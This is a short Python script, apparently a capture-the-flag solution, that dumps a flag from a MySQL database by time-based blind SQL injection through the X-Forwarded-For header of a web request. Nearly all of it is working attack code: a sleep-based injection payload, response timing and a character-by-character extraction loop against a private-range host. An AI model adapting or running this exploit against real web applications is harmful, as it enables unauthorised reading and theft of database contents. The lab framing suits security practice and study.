#!/usr/bin/env python3

#This script dumps the flag from a MySQL database via a time-based SQL injection in a HTTP header

import requests
import time
import string

url = "http://10.10.10.10/user?id=1"
characterlist = string.ascii_uppercase + string.digits + '{' + '}' + ':'
flag = ""
counter = 1

while True:
    for i in characterlist:
        payload = f"1' AND (SELECT sleep(2) FROM flag where SUBSTR(flag,{counter},1) = '{i}') and '1'='1"
        headers = {'X-Forwarded-For':payload}
        
        start = time.time()
        r = requests.get(url, headers = headers)
        end = time.time()
        
        if end-start >= 2:
            flag += i
            counter += 1
            break
    
    print(flag)
    
    if "}" in flag:
        exit(f"The Flag is: {flag}")